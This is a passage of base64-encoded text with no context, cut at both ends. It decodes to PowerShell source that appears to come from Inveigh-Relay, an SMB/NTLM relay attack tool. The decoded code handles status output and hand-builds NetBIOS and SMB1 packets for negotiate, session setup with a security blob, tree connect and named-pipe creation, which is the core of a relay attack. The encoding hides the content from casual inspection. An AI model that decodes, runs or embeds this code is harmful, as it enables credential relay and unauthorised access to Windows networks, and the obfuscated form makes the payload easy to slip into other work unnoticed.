ppZigkQ29uc29sZVVuaXF1ZSAtZXEgJ1knKQp7CiAgICAkaW52ZWlnaC5jb25zb2xlX3VuaXF1ZSA9ICR0cnVlCn0KZWxzZQp7CiAgICAkaW52ZWlnaC5jb25zb2xlX3VuaXF1ZSA9ICRmYWxzZQp9CgppZigkRmlsZU91dHB1dCAtZXEgJ1knKQp7CiAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJSZWFsIFRpbWUgRmlsZSBPdXRwdXQgPSBFbmFibGVkIikgPiAkbnVsbAogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiT3V0cHV0IERpcmVjdG9yeSA9ICRvdXRwdXRfZGlyZWN0b3J5IikgPiAkbnVsbAogICAgJGludmVpZ2guZmlsZV9vdXRwdXQgPSAkdHJ1ZQp9CmVsc2UKewogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiUmVhbCBUaW1lIEZpbGUgT3V0cHV0ID0gRGlzYWJsZWQiKSA+ICRudWxsCn0KCmlmKCRSdW5UaW1lIC1lcSAxKQp7CiAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJSdW4gVGltZSA9ICRSdW5UaW1lIE1pbnV0ZSIpID4gJG51bGwKfQplbHNlaWYoJFJ1blRpbWUgLWd0IDEpCnsKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIlJ1biBUaW1lID0gJFJ1blRpbWUgTWludXRlcyIpID4gJG51bGwKfQoKaWYoJFNob3dIZWxwIC1lcSAnWScpCnsKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIlJ1biBTdG9wLUludmVpZ2ggdG8gc3RvcCBJbnZlaWdoLVJlbGF5IikgPiAkbnVsbAogICAgICAgIAogICAgaWYoJGludmVpZ2guY29uc29sZV9vdXRwdXQpCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiUHJlc3MgYW55IGtleSB0byBzdG9wIHJlYWwgdGltZSBjb25zb2xlIG91dHB1dCIpID4gJG51bGwKICAgIH0KCn0KCmlmKCRpbnZlaWdoLnN0YXR1c19vdXRwdXQpCnsKCiAgICB3aGlsZSgkaW52ZWlnaC5zdGF0dXNfcXVldWUuQ291bnQgLWd0IDApCiAgICB7CgogICAgICAgIHN3aXRjaCAtV2lsZGNhcmQgKCRpbnZlaWdoLnN0YXR1c19xdWV1ZVswXSkKICAgICAgICB7CgogICAgICAgICAgICB7JF8gLWxpa2UgIiogRGlzYWJsZWQgRHVlIFRvICoiIC1vciAkXyAtbGlrZSAiUnVuIFN0b3AtSW52ZWlnaCB0byBzdG9wIEludmVpZ2gtUmVsYXkiIC1vciAkXyAtbGlrZSAiV2luZG93cyBGaXJld2FsbCA9IEVuYWJsZWQifQogICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgaWYoJGludmVpZ2gub3V0cHV0X3N0cmVhbV9vbmx5KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCgkaW52ZWlnaC5zdGF0dXNfcXVldWVbMF0gKyAkaW52ZWlnaC5uZXdsaW5lKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcoJGludmVpZ2guc3RhdHVzX3F1ZXVlWzBdKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5SZW1vdmVBdCgwKQogICAgICAgICAgICB9CgogICAgICAgICAgICBkZWZhdWx0CiAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5vdXRwdXRfc3RyZWFtX29ubHkpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0KCRpbnZlaWdoLnN0YXR1c19xdWV1ZVswXSArICRpbnZlaWdoLm5ld2xpbmUpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0KCRpbnZlaWdoLnN0YXR1c19xdWV1ZVswXSkKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuUmVtb3ZlQXQoMCkKICAgICAgICAgICAgfQoKICAgICAgICB9CgogICAgfQoKfQoKJHByb2Nlc3NfSUQgPSBbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NdOjpHZXRDdXJyZW50UHJvY2VzcygpIHwgU2VsZWN0LU9iamVjdCAtZXhwYW5kIGlkCiRwcm9jZXNzX0lEID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRwcm9jZXNzX0lEKSkKJHByb2Nlc3NfSUQgPSAkcHJvY2Vzc19JRCAtcmVwbGFjZSAiLTAwLTAwIiwiIgpbQnl0ZVtdXSRpbnZlaWdoLnByb2Nlc3NfSURfYnl0ZXMgPSAkcHJvY2Vzc19JRC5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CgojIEJlZ2luIFNjcmlwdEJsb2NrcwoKIyBTaGFyZWQgQmFzaWMgRnVuY3Rpb25zIFNjcmlwdEJsb2NrCiRzaGFyZWRfYmFzaWNfZnVuY3Rpb25zX3NjcmlwdGJsb2NrID0KewoKICAgIGZ1bmN0aW9uIERhdGFMZW5ndGgyCiAgICB7CiAgICAgICAgcGFyYW0gKFtJbnRdJGxlbmd0aF9zdGFydCxbQnl0ZVtdXSRzdHJpbmdfZXh0cmFjdF9kYXRhKQoKICAgICAgICAkc3RyaW5nX2xlbmd0aCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9VSW50MTYoJHN0cmluZ19leHRyYWN0X2RhdGFbJGxlbmd0aF9zdGFydC4uKCRsZW5ndGhfc3RhcnQgKyAxKV0sMCkKICAgICAgICByZXR1cm4gJHN0cmluZ19sZW5ndGgKICAgIH0KCiAgICBmdW5jdGlvbiBEYXRhTGVuZ3RoNAogICAgewogICAgICAgIHBhcmFtIChbSW50XSRsZW5ndGhfc3RhcnQsW0J5dGVbXV0kc3RyaW5nX2V4dHJhY3RfZGF0YSkKCiAgICAgICAgJHN0cmluZ19sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvVUludDMyKCRzdHJpbmdfZXh0cmFjdF9kYXRhWyRsZW5ndGhfc3RhcnQuLigkbGVuZ3RoX3N0YXJ0ICsgMyldLDApCiAgICAgICAgcmV0dXJuICRzdHJpbmdfbGVuZ3RoCiAgICB9CgogICAgZnVuY3Rpb24gRGF0YVRvU3RyaW5nCiAgICB7CiAgICAgICAgcGFyYW0gKFtJbnRdJHN0cmluZ19zdGFydCxbSW50XSRzdHJpbmdfbGVuZ3RoLFtCeXRlW11dJHN0cmluZ19leHRyYWN0X2RhdGEpCgogICAgICAgICRzdHJpbmdfZGF0YSA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJHN0cmluZ19leHRyYWN0X2RhdGFbJHN0cmluZ19zdGFydC4uKCRzdHJpbmdfc3RhcnQgKyAkc3RyaW5nX2xlbmd0aCAtIDEpXSkKICAgICAgICAkc3RyaW5nX2RhdGEgPSAkc3RyaW5nX2RhdGEgLXJlcGxhY2UgIi0wMCIsIiIKICAgICAgICAkc3RyaW5nX2RhdGEgPSAkc3RyaW5nX2RhdGEuU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0e1tDaGFyXVtTeXN0ZW0uQ29udmVydF06OlRvSW50MTYoJF8sMTYpfQogICAgICAgICRzdHJpbmdfZXh0cmFjdCA9IE5ldy1PYmplY3QgU3lzdGVtLlN0cmluZyAoJHN0cmluZ19kYXRhLDAsJHN0cmluZ19kYXRhLkxlbmd0aCkKICAgICAgICByZXR1cm4gJHN0cmluZ19leHRyYWN0CiAgICB9Cgp9CgojIElya2luIEZ1bmN0aW9ucyBTY3JpcHRCbG9jawokaXJraW5fZnVuY3Rpb25zX3NjcmlwdGJsb2NrID0KewogICAgZnVuY3Rpb24gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkKICAgIHsKICAgICAgICBwYXJhbSgkcGFja2V0X29yZGVyZWRfZGljdGlvbmFyeSkKCiAgICAgICAgRm9yRWFjaCgkZmllbGQgaW4gJHBhY2tldF9vcmRlcmVkX2RpY3Rpb25hcnkuVmFsdWVzKQogICAgICAgIHsKICAgICAgICAgICAgJGJ5dGVfYXJyYXkgKz0gJGZpZWxkCiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJGJ5dGVfYXJyYXkKICAgIH0KCiAgICAjTmV0QklPUwoKICAgIGZ1bmN0aW9uIEdldC1QYWNrZXROZXRCSU9TU2Vzc2lvblNlcnZpY2UoKQogICAgewogICAgICAgIHBhcmFtKFtJbnRdJHBhY2tldF9oZWFkZXJfbGVuZ3RoLFtJbnRdJHBhY2tldF9kYXRhX2xlbmd0aCkKCiAgICAgICAgW0J5dGVbXV0kcGFja2V0X25ldGJpb3Nfc2Vzc2lvbl9zZXJ2aWNlX2xlbmd0aCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJHBhY2tldF9oZWFkZXJfbGVuZ3RoICsgJHBhY2tldF9kYXRhX2xlbmd0aCkKICAgICAgICAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlX2xlbmd0aCA9ICRwYWNrZXRfbmV0Ymlvc19zZXNzaW9uX3NlcnZpY2VfbGVuZ3RoWzIuLjBdCgogICAgICAgICRwYWNrZXRfTmV0QklPU1Nlc3Npb25TZXJ2aWNlID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQuT3JkZXJlZERpY3Rpb25hcnkKICAgICAgICAkcGFja2V0X05ldEJJT1NTZXNzaW9uU2VydmljZS5BZGQoIk5ldEJJT1NTZXNzaW9uU2VydmljZV9NZXNzYWdlX1R5cGUiLFtCeXRlW11dKDB4MDApKQogICAgICAgICRwYWNrZXRfTmV0QklPU1Nlc3Npb25TZXJ2aWNlLkFkZCgiTmV0QklPU1Nlc3Npb25TZXJ2aWNlX0xlbmd0aCIsW0J5dGVbXV0oJHBhY2tldF9uZXRiaW9zX3Nlc3Npb25fc2VydmljZV9sZW5ndGgpKQoKICAgICAgICByZXR1cm4gJHBhY2tldF9OZXRCSU9TU2Vzc2lvblNlcnZpY2UKICAgIH0KCiAgICAjU01CMQoKICAgIGZ1bmN0aW9uIEdldC1QYWNrZXRTTUJIZWFkZXIoKQogICAgewogICAgICAgIHBhcmFtKFtCeXRlW11dJHBhY2tldF9jb21tYW5kLFtCeXRlW11dJHBhY2tldF9mbGFncyxbQnl0ZVtdXSRwYWNrZXRfZmxhZ3MyLFtCeXRlW11dJHBhY2tldF90cmVlX0lELFtCeXRlW11dJHBhY2tldF9wcm9jZXNzX0lELFtCeXRlW11dJHBhY2tldF91c2VyX0lEKQoKICAgICAgICAkcGFja2V0X1NNQkhlYWRlciA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5CiAgICAgICAgJHBhY2tldF9TTUJIZWFkZXIuQWRkKCJTTUJIZWFkZXJfUHJvdG9jb2wiLFtCeXRlW11dKDB4ZmYsMHg1MywweDRkLDB4NDIpKQogICAgICAgICRwYWNrZXRfU01CSGVhZGVyLkFkZCgiU01CSGVhZGVyX0NvbW1hbmQiLCRwYWNrZXRfY29tbWFuZCkKICAgICAgICAkcGFja2V0X1NNQkhlYWRlci5BZGQoIlNNQkhlYWRlcl9FcnJvckNsYXNzIixbQnl0ZVtdXSgweDAwKSkKICAgICAgICAkcGFja2V0X1NNQkhlYWRlci5BZGQoIlNNQkhlYWRlcl9SZXNlcnZlZCIsW0J5dGVbXV0oMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUJIZWFkZXIuQWRkKCJTTUJIZWFkZXJfRXJyb3JDb2RlIixbQnl0ZVtdXSgweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CSGVhZGVyLkFkZCgiU01CSGVhZGVyX0ZsYWdzIiwkcGFja2V0X2ZsYWdzKQogICAgICAgICRwYWNrZXRfU01CSGVhZGVyLkFkZCgiU01CSGVhZGVyX0ZsYWdzMiIsJHBhY2tldF9mbGFnczIpCiAgICAgICAgJHBhY2tldF9TTUJIZWFkZXIuQWRkKCJTTUJIZWFkZXJfUHJvY2Vzc0lESGlnaCIsW0J5dGVbXV0oMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQkhlYWRlci5BZGQoIlNNQkhlYWRlcl9TaWduYXR1cmUiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUJIZWFkZXIuQWRkKCJTTUJIZWFkZXJfUmVzZXJ2ZWQyIixbQnl0ZVtdXSgweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CSGVhZGVyLkFkZCgiU01CSGVhZGVyX1RyZWVJRCIsJHBhY2tldF90cmVlX0lEKQogICAgICAgICRwYWNrZXRfU01CSGVhZGVyLkFkZCgiU01CSGVhZGVyX1Byb2Nlc3NJRCIsJHBhY2tldF9wcm9jZXNzX0lEKQogICAgICAgICRwYWNrZXRfU01CSGVhZGVyLkFkZCgiU01CSGVhZGVyX1VzZXJJRCIsJHBhY2tldF91c2VyX0lEKQogICAgICAgICRwYWNrZXRfU01CSGVhZGVyLkFkZCgiU01CSGVhZGVyX011bHRpcGxleElEIixbQnl0ZVtdXSgweDAwLDB4MDApKQoKICAgICAgICByZXR1cm4gJHBhY2tldF9TTUJIZWFkZXIKICAgIH0KCiAgICBmdW5jdGlvbiBHZXQtUGFja2V0U01CTmVnb3RpYXRlUHJvdG9jb2xSZXF1ZXN0KCkKICAgIHsKICAgICAgICBwYXJhbShbU3RyaW5nXSRwYWNrZXRfdmVyc2lvbikKCiAgICAgICAgaWYoJHBhY2tldF92ZXJzaW9uIC1lcSAnU01CMScpCiAgICAgICAgewogICAgICAgICAgICBbQnl0ZVtdXSRwYWNrZXRfYnl0ZV9jb3VudCA9IDB4MGMsMHgwMAogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBbQnl0ZVtdXSRwYWNrZXRfYnl0ZV9jb3VudCA9IDB4MjIsMHgwMCAgCiAgICAgICAgfQoKICAgICAgICAkcGFja2V0X1NNQk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5CiAgICAgICAgJHBhY2tldF9TTUJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3QuQWRkKCJTTUJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3RfV29yZENvdW50IixbQnl0ZVtdXSgweDAwKSkKICAgICAgICAkcGFja2V0X1NNQk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdC5BZGQoIlNNQk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdF9CeXRlQ291bnQiLCRwYWNrZXRfYnl0ZV9jb3VudCkKICAgICAgICAkcGFja2V0X1NNQk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdC5BZGQoIlNNQk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdF9SZXF1ZXN0ZWREaWFsZWN0c19EaWFsZWN0X0J1ZmZlckZvcm1hdCIsW0J5dGVbXV0oMHgwMikpCiAgICAgICAgJHBhY2tldF9TTUJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3QuQWRkKCJTTUJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3RfUmVxdWVzdGVkRGlhbGVjdHNfRGlhbGVjdF9OYW1lIixbQnl0ZVtdXSgweDRlLDB4NTQsMHgyMCwweDRjLDB4NGQsMHgyMCwweDMwLDB4MmUsMHgzMSwweDMyLDB4MDApKQoKICAgICAgICBpZigkcGFja2V0X3ZlcnNpb24gLW5lICdTTUIxJykKICAgICAgICB7CiAgICAgICAgICAgICRwYWNrZXRfU01CTmVnb3RpYXRlUHJvdG9jb2xSZXF1ZXN0LkFkZCgiU01CTmVnb3RpYXRlUHJvdG9jb2xSZXF1ZXN0X1JlcXVlc3RlZERpYWxlY3RzX0RpYWxlY3RfQnVmZmVyRm9ybWF0MiIsW0J5dGVbXV0oMHgwMikpCiAgICAgICAgICAgICRwYWNrZXRfU01CTmVnb3RpYXRlUHJvdG9jb2xSZXF1ZXN0LkFkZCgiU01CTmVnb3RpYXRlUHJvdG9jb2xSZXF1ZXN0X1JlcXVlc3RlZERpYWxlY3RzX0RpYWxlY3RfTmFtZTIiLFtCeXRlW11dKDB4NTMsMHg0ZCwweDQyLDB4MjAsMHgzMiwweDJlLDB4MzAsMHgzMCwweDMyLDB4MDApKQogICAgICAgICAgICAkcGFja2V0X1NNQk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdC5BZGQoIlNNQk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdF9SZXF1ZXN0ZWREaWFsZWN0c19EaWFsZWN0X0J1ZmZlckZvcm1hdDMiLFtCeXRlW11dKDB4MDIpKQogICAgICAgICAgICAkcGFja2V0X1NNQk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdC5BZGQoIlNNQk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdF9SZXF1ZXN0ZWREaWFsZWN0c19EaWFsZWN0X05hbWUzIixbQnl0ZVtdXSgweDUzLDB4NGQsMHg0MiwweDIwLDB4MzIsMHgyZSwweDNmLDB4M2YsMHgzZiwweDAwKSkKICAgICAgICB9CgogICAgICAgIHJldHVybiAkcGFja2V0X1NNQk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdAogICAgfQoKICAgIGZ1bmN0aW9uIEdldC1QYWNrZXRTTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdCgpCiAgICB7CiAgICAgICAgcGFyYW0oW0J5dGVbXV0kcGFja2V0X3NlY3VyaXR5X2Jsb2IpCgogICAgICAgIFtCeXRlW11dJHBhY2tldF9ieXRlX2NvdW50ID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcGFja2V0X3NlY3VyaXR5X2Jsb2IuTGVuZ3RoKQogICAgICAgICRwYWNrZXRfYnl0ZV9jb3VudCA9ICRwYWNrZXRfYnl0ZV9jb3VudFswLDFdCiAgICAgICAgW0J5dGVbXV0kcGFja2V0X3NlY3VyaXR5X2Jsb2JfbGVuZ3RoID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcGFja2V0X3NlY3VyaXR5X2Jsb2IuTGVuZ3RoICsgNSkKICAgICAgICAkcGFja2V0X3NlY3VyaXR5X2Jsb2JfbGVuZ3RoID0gJHBhY2tldF9zZWN1cml0eV9ibG9iX2xlbmd0aFswLDFdCgogICAgICAgICRwYWNrZXRfU01CU2Vzc2lvblNldHVwQW5kWFJlcXVlc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeQogICAgICAgICRwYWNrZXRfU01CU2Vzc2lvblNldHVwQW5kWFJlcXVlc3QuQWRkKCJTTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdF9Xb3JkQ291bnQiLFtCeXRlW11dKDB4MGMpKQogICAgICAgICRwYWNrZXRfU01CU2Vzc2lvblNldHVwQW5kWFJlcXVlc3QuQWRkKCJTTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdF9BbmRYQ29tbWFuZCIsW0J5dGVbXV0oMHhmZikpCiAgICAgICAgJHBhY2tldF9TTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdC5BZGQoIlNNQlNlc3Npb25TZXR1cEFuZFhSZXF1ZXN0X1Jlc2VydmVkIixbQnl0ZVtdXSgweDAwKSkKICAgICAgICAkcGFja2V0X1NNQlNlc3Npb25TZXR1cEFuZFhSZXF1ZXN0LkFkZCgiU01CU2Vzc2lvblNldHVwQW5kWFJlcXVlc3RfQW5kWE9mZnNldCIsW0J5dGVbXV0oMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQlNlc3Npb25TZXR1cEFuZFhSZXF1ZXN0LkFkZCgiU01CU2Vzc2lvblNldHVwQW5kWFJlcXVlc3RfTWF4QnVmZmVyIixbQnl0ZVtdXSgweGZmLDB4ZmYpKQogICAgICAgICRwYWNrZXRfU01CU2Vzc2lvblNldHVwQW5kWFJlcXVlc3QuQWRkKCJTTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdF9NYXhNcHhDb3VudCIsW0J5dGVbXV0oMHgwMiwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQlNlc3Npb25TZXR1cEFuZFhSZXF1ZXN0LkFkZCgiU01CU2Vzc2lvblNldHVwQW5kWFJlcXVlc3RfVkNOdW1iZXIiLFtCeXRlW11dKDB4MDEsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdC5BZGQoIlNNQlNlc3Npb25TZXR1cEFuZFhSZXF1ZXN0X1Nlc3Npb25LZXkiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CU2Vzc2lvblNldHVwQW5kWFJlcXVlc3QuQWRkKCJTTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdF9TZWN1cml0eUJsb2JMZW5ndGgiLCRwYWNrZXRfYnl0ZV9jb3VudCkKICAgICAgICAkcGFja2V0X1NNQlNlc3Npb25TZXR1cEFuZFhSZXF1ZXN0LkFkZCgiU01CU2Vzc2lvblNldHVwQW5kWFJlcXVlc3RfUmVzZXJ2ZWQyIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQlNlc3Npb25TZXR1cEFuZFhSZXF1ZXN0LkFkZCgiU01CU2Vzc2lvblNldHVwQW5kWFJlcXVlc3RfQ2FwYWJpbGl0aWVzIixbQnl0ZVtdXSgweDQ0LDB4MDAsMHgwMCwweDgwKSkKICAgICAgICAkcGFja2V0X1NNQlNlc3Npb25TZXR1cEFuZFhSZXF1ZXN0LkFkZCgiU01CU2Vzc2lvblNldHVwQW5kWFJlcXVlc3RfQnl0ZUNvdW50IiwkcGFja2V0X3NlY3VyaXR5X2Jsb2JfbGVuZ3RoKQogICAgICAgICRwYWNrZXRfU01CU2Vzc2lvblNldHVwQW5kWFJlcXVlc3QuQWRkKCJTTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdF9TZWN1cml0eUJsb2IiLCRwYWNrZXRfc2VjdXJpdHlfYmxvYikKICAgICAgICAkcGFja2V0X1NNQlNlc3Npb25TZXR1cEFuZFhSZXF1ZXN0LkFkZCgiU01CU2Vzc2lvblNldHVwQW5kWFJlcXVlc3RfTmF0aXZlT1MiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQlNlc3Npb25TZXR1cEFuZFhSZXF1ZXN0LkFkZCgiU01CU2Vzc2lvblNldHVwQW5kWFJlcXVlc3RfTmF0aXZlTEFOTWFuYWdlIixbQnl0ZVtdXSgweDAwLDB4MDApKQoKICAgICAgICByZXR1cm4gJHBhY2tldF9TTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdCAKICAgIH0KCiAgICBmdW5jdGlvbiBHZXQtUGFja2V0U01CVHJlZUNvbm5lY3RBbmRYUmVxdWVzdCgpCiAgICB7CiAgICAgICAgcGFyYW0oW0J5dGVbXV0kcGFja2V0X3BhdGgpCgogICAgICAgIFtCeXRlW11dJHBhY2tldF9wYXRoX2xlbmd0aCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJHBhY2tldF9wYXRoLkxlbmd0aCArIDcpCiAgICAgICAgJHBhY2tldF9wYXRoX2xlbmd0aCA9ICRwYWNrZXRfcGF0aF9sZW5ndGhbMCwxXQoKICAgICAgICAkcGFja2V0X1NNQlRyZWVDb25uZWN0QW5kWFJlcXVlc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeQogICAgICAgICRwYWNrZXRfU01CVHJlZUNvbm5lY3RBbmRYUmVxdWVzdC5BZGQoIlNNQlRyZWVDb25uZWN0QW5kWFJlcXVlc3RfV29yZENvdW50IixbQnl0ZVtdXSgweDA0KSkKICAgICAgICAkcGFja2V0X1NNQlRyZWVDb25uZWN0QW5kWFJlcXVlc3QuQWRkKCJTTUJUcmVlQ29ubmVjdEFuZFhSZXF1ZXN0X0FuZFhDb21tYW5kIixbQnl0ZVtdXSgweGZmKSkKICAgICAgICAkcGFja2V0X1NNQlRyZWVDb25uZWN0QW5kWFJlcXVlc3QuQWRkKCJTTUJUcmVlQ29ubmVjdEFuZFhSZXF1ZXN0X1Jlc2VydmVkIixbQnl0ZVtdXSgweDAwKSkKICAgICAgICAkcGFja2V0X1NNQlRyZWVDb25uZWN0QW5kWFJlcXVlc3QuQWRkKCJTTUJUcmVlQ29ubmVjdEFuZFhSZXF1ZXN0X0FuZFhPZmZzZXQiLFtCeXRlW11dKDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUJUcmVlQ29ubmVjdEFuZFhSZXF1ZXN0LkFkZCgiU01CVHJlZUNvbm5lY3RBbmRYUmVxdWVzdF9GbGFncyIsW0J5dGVbXV0oMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQlRyZWVDb25uZWN0QW5kWFJlcXVlc3QuQWRkKCJTTUJUcmVlQ29ubmVjdEFuZFhSZXF1ZXN0X1Bhc3N3b3JkTGVuZ3RoIixbQnl0ZVtdXSgweDAxLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CVHJlZUNvbm5lY3RBbmRYUmVxdWVzdC5BZGQoIlNNQlRyZWVDb25uZWN0QW5kWFJlcXVlc3RfQnl0ZUNvdW50IiwkcGFja2V0X3BhdGhfbGVuZ3RoKQogICAgICAgICRwYWNrZXRfU01CVHJlZUNvbm5lY3RBbmRYUmVxdWVzdC5BZGQoIlNNQlRyZWVDb25uZWN0QW5kWFJlcXVlc3RfUGFzc3dvcmQiLFtCeXRlW11dKDB4MDApKQogICAgICAgICRwYWNrZXRfU01CVHJlZUNvbm5lY3RBbmRYUmVxdWVzdC5BZGQoIlNNQlRyZWVDb25uZWN0QW5kWFJlcXVlc3RfVHJlZSIsJHBhY2tldF9wYXRoKQogICAgICAgICRwYWNrZXRfU01CVHJlZUNvbm5lY3RBbmRYUmVxdWVzdC5BZGQoIlNNQlRyZWVDb25uZWN0QW5kWFJlcXVlc3RfU2VydmljZSIsW0J5dGVbXV0oMHgzZiwweDNmLDB4M2YsMHgzZiwweDNmLDB4MDApKQoKICAgICAgICByZXR1cm4gJHBhY2tldF9TTUJUcmVlQ29ubmVjdEFuZFhSZXF1ZXN0CiAgICB9CgogICAgZnVuY3Rpb24gR2V0LVBhY2tldFNNQk5UQ3JlYXRlQW5kWFJlcXVlc3QoKQogICAgewogICAgICAgIHBhcmFtKFtCeXRlW11dJHBhY2tldF9uYW1lZF9waXBlKQoKICAgICAgICBbQnl0ZVtdXSRwYWNrZXRfbmFtZWRfcGlwZV9sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRwYWNrZXRfbmFtZWRfcGlwZS5MZW5ndGgpCiAgICAgICAgJHBhY2tldF9uYW1lZF9waXBlX2xlbmd0aCA9ICRwYWNrZXRfbmFtZWRfcGlwZV9sZW5ndGhbMCwxXQogICAgICAgIFtCeXRlW11dJHBhY2tldF9maWxlX25hbWVfbGVuZ3RoID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcGFja2V0X25hbWVkX3BpcGUuTGVuZ3RoIC0gMSkKICAgICAgICAkcGFja2V0X2ZpbGVfbmFtZV9sZW5ndGggPSAkcGFja2V0X2ZpbGVfbmFtZV9sZW5ndGhbMCwxXQoKICAgICAgICAkcGFja2V0X1NNQk5UQ3JlYXRlQW5kWFJlcXVlc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeQogICAgICAgICRwYWNrZXRfU01CTlRDcmVhdGVBbmRYUmVxdWVzdC5BZGQoIlNNQk5UQ3JlYXRlQW5kWFJlcXVlc3RfV29yZENvdW50IixbQnl0ZVtdXSgweDE4KSkKICAgICAgICAkcGFja2V0X1NNQk5UQ3JlYXRlQW5kWFJlcXVlc3QuQWRkKCJTTUJOVENyZWF0ZUFuZFhSZXF1ZXN0X0FuZFhDb21tYW5kIixbQnl0ZVtdXSgweGZmKSkKICAgICAgICAkcGFja2V0X1NNQk5UQ3JlYXRlQW5kWFJlcXVlc3QuQWRkKCJTTUJOVENyZWF0ZUFuZFhSZXF1ZXN0X1Jlc2VydmVkIixbQnl0ZVtdXSg